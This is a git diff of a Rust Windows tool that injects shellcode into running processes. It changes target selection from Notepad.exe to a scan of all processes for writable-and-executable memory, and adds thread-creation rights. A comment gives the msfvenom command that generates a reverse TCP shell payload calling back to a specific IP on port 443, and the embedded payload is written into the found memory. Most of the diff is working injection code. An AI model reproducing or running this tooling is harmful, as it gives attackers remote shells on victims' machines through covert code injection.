@@ -15,18 +15,18 @@ use windows_sys::{
                 MEM_COMMIT, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE, VirtualQueryEx,
             },
             Threading::{
-                CreateRemoteThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-                PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
+                CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
+                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
             },
             WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
         },
     },
 };
 
+// msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.26.116.194 LPORT=443 -f raw -o shellcode.bin
 const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 
-fn get_pid(proc_name: &str) -> u32 {
-    let mut pid: u32 = 0;
+fn get_valid_target() -> (*mut c_void, u32) {
     unsafe {
         let mut return_length: u32 = 0;
         let status = NtQuerySystemInformation(
@@ -38,7 +38,7 @@ fn get_pid(proc_name: &str) -> u32 {
 
         if status != STATUS_INFO_LENGTH_MISMATCH {
             println!("[-] Failed to query system information: {}", status);
-            return pid;
+            return (null_mut(), 0);
         }
 
         let buff_size = return_length as usize;
@@ -53,22 +53,33 @@ fn get_pid(proc_name: &str) -> u32 {
 
         if status != 0 {
             println!("[-] Failed to query system information: {}", status);
-            return pid;
+            return (null_mut(), 0);
         }
 
         let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
         loop {
-            if !(*proc_info).ImageName.Buffer.is_null()
-                && proc_name.eq_ignore_ascii_case(
-                    &String::from_utf16_lossy(slice::from_raw_parts(
+            let proc_handle = OpenProcess(
+                PROCESS_VM_READ
+                    | PROCESS_VM_OPERATION
+                    | PROCESS_QUERY_INFORMATION
+                    | PROCESS_VM_WRITE
+                    | PROCESS_CREATE_THREAD,
+                0,
+                (*proc_info).UniqueProcessId as u32,
+            );
+
+            let rwx_region = find_rwx(proc_handle, SHELLCODE.len());
+
+            if !rwx_region.is_null() {
+                println!(
+                    "[+] Found RWX region in process {}: {:016X?}",
+                    String::from_utf16_lossy(slice::from_raw_parts(
                         (*proc_info).ImageName.Buffer,
                         (*proc_info).ImageName.Length as usize / 2,
-                    ))
-                    .as_str(),
-                )
-            {
-                pid = (*proc_info).UniqueProcessId as u32;
-                break;
+                    )),
+                    rwx_region
+                );
+                return (rwx_region, (*proc_info).UniqueProcessId as u32);
             }
 
             if (*proc_info).NextEntryOffset == 0 {
@@ -80,10 +91,10 @@ fn get_pid(proc_name: &str) -> u32 {
         }
     }
 
-    pid
+    (null_mut(), 0)
 }
 
-fn find_rwx(proc_handle: *mut c_void, min_len: usize) -> Option<*mut c_void> {
+fn find_rwx(proc_handle: *mut c_void, min_len: usize) -> *mut c_void {
     unsafe {
         let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();
 
@@ -108,29 +119,25 @@ fn find_rwx(proc_handle: *mut c_void, min_len: usize) -> Option<*mut c_void> {
                     "[+] Found RWX region at: {:016X?}, size: {}",
                     mbi.BaseAddress, mbi.RegionSize
                 );
-                return Some(mbi.BaseAddress);
+                return mbi.BaseAddress;
             }
 
             addr = (mbi.BaseAddress as usize + mbi.RegionSize) as *mut c_void;
         }
     }
-    None
+    null_mut()
 }
 
 fn main() {
-    let proc_name = "Notepad.exe";
-    let pid = get_pid(proc_name);
-
-    if pid == 0 {
-        println!("[-] {} not found", proc_name);
-        return;
-    }
-
-    println!("[+] Found {}, PID: {}", proc_name, pid);
+    let (rwx_region, pid) = get_valid_target();
 
     let proc_handle = unsafe {
         OpenProcess(
-            PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+            PROCESS_VM_OPERATION
+                | PROCESS_QUERY_INFORMATION
+                | PROCESS_VM_READ
+                | PROCESS_VM_WRITE
+                | PROCESS_CREATE_THREAD,
             0,
             pid,
         )
@@ -140,14 +147,6 @@ fn main() {
         println!("[-] Failed to open process");
         return;
     }
-
-    let rwx_region = match find_rwx(proc_handle, SHELLCODE.len()) {
-        Some(rwx_region) => rwx_region,
-        None => {
-            println!("[-] No RWX region found in {}'s memory", proc_name);
-            return;
-        }
-    };
 
     println!("[+] Writing shellcode to RWX region...");
 
